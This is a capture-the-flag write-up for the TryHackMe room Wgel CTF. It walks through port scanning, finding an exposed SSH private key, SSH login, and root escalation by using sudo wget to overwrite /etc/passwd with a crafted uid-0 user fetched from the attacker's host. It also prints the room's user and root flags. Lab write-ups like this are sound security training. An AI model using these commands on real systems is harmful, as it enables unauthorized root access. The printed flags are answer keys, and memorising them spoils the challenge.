# 🛡️ TryHackMe – Wgel CTF - Writeup

## 📌 Overview
**Room Name:** Wgel CTF  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Enumeration / Privilege Escalation

This machine demonstrates how a seemingly harmless binary granted excessive sudo privileges can lead to full system compromise via arbitrary file write.

The attack chain involves:

- Web directory enumeration revealing an exposed `.ssh/` directory
- SSH private key and username discovery from HTML comments
- SSH login as `jessie`
- sudo `wget` exploitation to overwrite `/etc/passwd`
- Privilege escalation to root by switching to a crafted user

---

## 🔍 1. Enumeration

### 🔎 Port Scanning

```bash
nmap -sV -oN nmap.log <target_ip>
```

### 🌐 Web Directory Enumeration

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
```

Discovered `/sitemap` (Status: 301), which led to `/sitemap/.ssh/` — containing an exposed RSA private key.

The username `jessie` was also found in the page's HTML source comments.

---

## 🔓 2. Initial Access

Using the discovered RSA key and username `jessie`:

```bash
chmod 600 id_rsa
ssh -i id_rsa jessie@<target_ip>
```

**Initial access as `jessie` achieved.** ✅

---

## 👑 3. Privilege Escalation: jessie → root

### 🔍 Sudo Misconfiguration — wget
Ran `linpeas.sh` to enumerate privilege escalation vectors, then verified manually:

```bash
sudo -l
```

```text
(root) NOPASSWD: /usr/bin/wget
```

`wget` with sudo allows **arbitrary file write** — including overwriting system-critical files.

### 🛠️ /etc/passwd Overwrite Attack

**Step 1:** Generate an MD5-crypt password hash on Kali:

```bash
openssl passwd -1 1234
# Result: $1$oDwlj2tO$VL4knQ9qhR2F6K7bOrT2B0
```

**Step 2:** Create a malicious `passwd` file with a custom root-level user:

```
hacker:$1$oDwlj2tO$VL4knQ9qhR2F6K7bOrT2B0:0:0:root:/root:/bin/bash
```

**Step 3:** Host and overwrite `/etc/passwd` using `wget`:

```bash
sudo /usr/bin/wget http://<kali_ip>/passwd -O /etc/passwd
```

**Step 4:** Switch to the new user:

```bash
su hacker
# Password: 1234

id
# uid=0(root) gid=0(root) groups=0(root)
```

**ROOT ACCESS GRANTED.** ✅

---

## 🏁 Flags

### 🧍 User Flag

```
057c67131c3d5e42dd5cd3075b198ff6
```

### 👑 Root Flag

```
b1b968b37519ad1daa6408188649263d
```

---

## 📚 Key Takeaways

- 🔑 **SSH keys must never be web-accessible:** Private keys stored in a directory served by a web server are trivially discoverable and immediately exploitable.
- 🌐 **Comment hygiene matters:** Usernames embedded in HTML comments give attackers a direct target for credential attacks.
- ⚠️ **"Safe" binaries can be fatal with sudo:** `wget` is not typically considered dangerous, but arbitrary file write capability combined with root privileges leads directly to full system compromise.

---

## 🛠️ Tools Used

- `nmap`
- `gobuster`
- `linpeas`
- `openssl`
- `ssh`
- `wget`

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
